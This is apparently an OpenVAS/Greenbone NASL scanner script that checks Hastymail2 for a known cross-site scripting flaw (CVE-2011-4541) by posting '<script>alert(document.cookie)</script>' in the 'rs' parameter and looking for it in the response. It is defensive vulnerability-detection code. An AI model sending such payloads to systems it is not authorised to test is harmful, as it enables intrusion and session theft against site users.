# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:hastymail:hastymail2";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902590");
  script_version("2023-10-27T05:05:28+0000");
  script_tag(name:"last_modification", value:"2023-10-27 05:05:28 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2011-11-24 12:12:12 +0530 (Thu, 24 Nov 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_cve_id("CVE-2011-4541");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Hastymail2 < 2.1.1 RC2 XSS Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_hastymail2_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("hastymail2/http/detected");

  script_tag(name:"summary", value:"Hastymail2 is prone to a cross-site scripting (XSS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to improper validation of user-supplied input
  via the 'rs' parameter to index.php (when 'page' is set to 'mailbox' and 'mailbox' is set to
  'Drafts'), which allows attackers to execute arbitrary HTML and script code in a user's browser
  session in the context of an affected site.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser session in the context
  of an affected site.");

  script_tag(name:"affected", value:"Hastymail2 version 2.1.1 and prior.");

  script_tag(name:"solution", value:"Update to version 2.1.1 RC2 or later.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50789");
  script_xref(name:"URL", value:"https://www.dognaedis.com/vulns/DGS-SEC-2.html");
  script_xref(name:"URL", value:"https://www.dognaedis.com/vulns/pdf/DGS-SEC-2.pdf");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/index.php?page=mailbox&mailbox=Drafts";

data = "rs=<script>alert(document.cookie)</script>";

headers = make_array("Content-Type", "application/x-www-form-urlencoded");

req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
res = http_keepalive_send_recv(port:port, data:req);

if (res =~ "^HTTP/1\.[01] 200" && "<script>alert(document.cookie)</script>" >< res) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
